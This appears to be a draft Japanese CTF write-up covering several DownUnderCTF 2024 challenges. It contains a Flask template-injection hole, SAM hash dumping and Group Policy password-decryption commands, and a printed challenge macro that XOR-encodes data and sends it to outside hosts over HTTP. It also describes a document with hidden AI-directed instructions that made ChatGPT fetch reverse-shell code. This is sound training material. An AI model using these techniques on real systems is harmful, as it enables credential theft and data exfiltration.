---
title: "DUCTF2024"
date: 2024-07-18T23:18:50+09:00
draft: true
---


## Beginner

### tldr please summarise

> I thought I was being 1337 by asking AI to help me solve challenges, now I have to reinstall Windows again. Can you help me out by find the flag in this document?

zip 解凍で見つからなかったので保留にしていたが，AI とか言ってるので chatGPT に投げたらなにやら pastebin にアクセスしている．
アクセスして base64 デコードするとリバースシェルのコード + flag が見える

### parrot the emu

> It is so nice to hear Parrot the Emu talk back

入力をそのまま応答してくれる (parrot) アプリが渡される．

```python
def vulnerable():
    chat_log = []

    if request.method == 'POST':
        user_input = request.form.get('user_input')
        try:
            result = render_template_string(user_input)
        except Exception as e:
            result = str(e)

        chat_log.append(('User', user_input))
        chat_log.append(('Emu', result))
    
    return render_template('index.html', chat_log=chat_log)
```

Flask で，```render_template_string``` が怪しい．
調べると Server-Side Template Injection ができる

### Sun Zi's Perfect Math Class

> Everybody!! Sunzi's math class is about to begin!!!

CRT をやる

### zoo feedback form

> The zoo wants your feedback! Simply fill in the form, and send away, we'll handle it from there!

Burp で通信を見ると XML を使っているらしい．
[XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity) をやればいい．

### shufflebox

>I've learned that if you shuffle your text, it's elrlay hrda to tlle htaw eht nioiglra nutpi aws.
> Find the text censored with question marks in output_censored.txt and surround it with DUCTF{}.

以下のような出力がある．

```txt
aaaabbbbccccdddd -> ccaccdabdbdbbada
abcdabcdabcdabcd -> bcaadbdcdbcdacab
???????????????? -> owuwspdgrtejiiud
```

1,2 行目の変換から 3 行目の変換は一意に決まる．

### number mashing

> Mash your keyboard numpad in a specific order and a flag might just pop out!

デコンパイルすると A != 0, B != 0,1 のとき，A / B = A となる A, B を見つけよ，という問題に帰着する．
int のオーバーフローを目指せばいいので，A = 2147483648，B = -1

### Intercepted Transmissions

> Those monsters! They've kidnapped the Quokkas! Who in their right mind would capture those friendly little guys.. We've managed to intercept a CCIR476 transmission from the kidnappers, we think it contains the location of our friends! Can you help us decode it? We managed to decode the first two characters as '##'

CCIR476 とかいう方式でデコードしているらしい．
[ここ](https://github.com/AI5GW/CCIR476)を見てあとは気合

## Forensics

### Baby's First Forensics

> They've been trying to breach our infrastructure all morning! They're trying to get more info on our covert kangaroos! We need your help, we've captured some traffic of them attacking us, can you tell us what tool they were using and its version?

WireShark にかけてあげると Nikto/2.1.6 がみえる

### SAM I AM

> The attacker managed to gain Domain Admin on our rebels Domain Controller! Looks like they managed to log on with an account using WMI and dumped some files.

SAM は，Windows でユーザアカウントとアクセス権についての設定を管理する．
各コンピュータごとに作られるローカルアカウントの管理に用いる．

こういう OS 認証情報のダンプはやったことがなかったが，調べると impacket が使えるらしい

```secretsdump.py -sam sam.bak -system system.bak LOCAL```

Admin の hash 値がでてくるので，hashes で解析する．

### Bad Policies

> Looks like the attacker managed to access the rebels Domain Controller.
> Can you figure out how they got access after pulling these artifacts from one of our Outpost machines?

AD のグループポリシー設定が配られる．
cpassword の脆弱性が知られている．というかグループポリシー系はこれしか知らない．．．

```grep -r "cpassword"```

[gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt) で解析すると flag が得られる．

### Macro Magic

> We managed to pull this excel spreadsheet artifact from one of our Outpost machines. Its got something sus happening under the hood. After opening we found and captured some suspicious traffic on our network. Can you find out what this traffic is and find the flag!

不審なマクロファイル (excel) とパケットキャプチャをもらえる．
不審な通信をキャプチャしているらしい．

```olevba Monke.xlsm```

結果を抜粋すると以下

```macro
Public Function anotherThing(B As String, C As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(B)
        A = A & Chr(Asc(Mid(B, I, 1)) Xor Asc(Mid(C, (I - 1) Mod Len(C) + 1, 1)))
    Next I
    anotherThing = A
End Function

ublic Function importantThing()
    Dim tempString As String
    Dim tempInteger As Integer
    Dim I As Integer
    Dim J As Integer
    For I = 1 To 5
        Cells(I, 2).Value = WorksheetFunction.RandBetween(0, 1000)
    Next I
    For I = 1 To 5
        For J = I + 1 To 5
            If Cells(J, 2).Value < Cells(I, 2).Value Then
                tempString = Cells(I, 1).Value
                Cells(I, 1).Value = Cells(J, 1).Value
                Cells(J, 1).Value = tempString
                tempInteger = Cells(I, 2).Value
                Cells(I, 2).Value = Cells(J, 2).Value
                Cells(J, 2).Value = tempInteger
            End If
        Next J
    Next I
End Function



Public Function totalyFine(A As String) As String
    Dim B As String
    B = Replace(A, " ", "-")
    totalyFine = B
End Functio



Sub macro1()
    Dim Path As String
    Dim wb As Workbook
    Dim A As String
    Dim B As String
    Dim C As String
    Dim D As String
    Dim E As String
    Dim F As String
    Dim G As String
    Dim H As String
    Dim J As String
    Dim K As String
    Dim L As String
    Dim M As String
    Dim N As String
    Dim O As String
    Dim P As String
    Dim Q As String
    Dim R As String
    Dim S As String
    Dim T As String
    Dim U As String
    Dim V As String
    Dim W As String
    Dim X As String
    Dim Y As String
    Dim Z As String
    Dim I As Long
    N = importantThing()
    K = "Yes"
    S = "Mon"
    U = forensics(K)
    V = totalyFine(U)
    D = "Ma"
    J = "https://play.duc.tf/" + V
    superThing (J)
    J = "http://flag.com/"
    superThing (J)
    G = "key"
    J = "http://play.duc.tf/"
    superThing (J)
    J = "http://en.wikipedia.org/wiki/Emu_War"
    superThing (J)
    N = importantThing()
    Path = ThisWorkbook.Path & "\flag.xlsx"
    Set wb = Workbooks.Open(Path)
    Dim valueA1 As Variant
    valueA1 = wb.Sheets(1).Range("A1").Value
    MsgBox valueA1
    wb.Close SaveChanges:=False
    F = "gic"
    N = importantThing()
    Q = "Flag: " & valueA1
    H = "Try Harder"
    U = forensics(H)
    V = totalyFine(U)
    J = "http://downunderctf.com/" + V
    superThing (J)
    W = S + G + D + F
    O = doThing(Q, W)
    M = anotherThing(O, W)
    A = something(O)
    Z = forensics(O)
    N = importantThing()
    P = "Pterodactyl"
    U = forensics(P)
    V = totalyFine(U)
    J = "http://play.duc.tf/" + V
    superThing (J)
    T = totalyFine(Z)
    MsgBox T
    J = "http://downunderctf.com/" + T
    superThing (J)
    N = importantThing()
    E = "Forensics"
    U = forensics(E)
    V = totalyFine(U)
    J = "http://play.duc.tf/" + V
    superThing (J)
    


Public Function doThing(B As String, C As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(B)
        A = A & Chr(Asc(Mid(B, I, 1)) Xor Asc(Mid(C, (I - 1) Mod Len(C) + 1, 1)))
    Next I
    doThing = A
End Function


Public Function superThing(ByVal A As String) As String
    With CreateObject("MSXML2.ServerXMLHTTP.6.0")
        .Open "GET", A, False
        .Send
        superThing = StrConv(.responseBody, vbUnicode)
    End With
End Function


Public Function something(B As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(inputText)
        A = A & WorksheetFunction.Dec2Bin(Asc(Mid(B, I, 1)))
    Next I
    something = A
End Function


Public Function forensics(B As String) As String
    Dim A() As Byte
    Dim I As Integer
    Dim C As String
    A = StrConv(B, vbFromUnicode)
    For I = LBound(A) To UBound(A)
        C = C & CStr(A(I)) & " "
    Next I
    C = Trim(C)
    forensics = C
End Function

-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|MSXML2.ServerXMLHTTP|May download files from the Internet         |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |https://play.duc.tf/|URL                                          |
|IOC       |http://flag.com/    |URL                                          |
|IOC       |http://play.duc.tf/ |URL                                          |
|IOC       |http://en.wikipedia.|URL                                          |
|          |org/wiki/Emu_War    |                                             |
|IOC       |http://downunderctf.|URL                                          |
|          |com/                |                                             |
+----------+--------------------+---------------------------------------------+
```

doThings() が XOR っぽく，鍵は平文で書かれているので，wireshark から HTTP object を export して，暗号文っぽいものを XOR してあげればいい

## rev

### rusty-vault

> I've learnt all the secure coding practices. I only use memory safe languages and military grade encryption. Surely, you can't break into my vault.


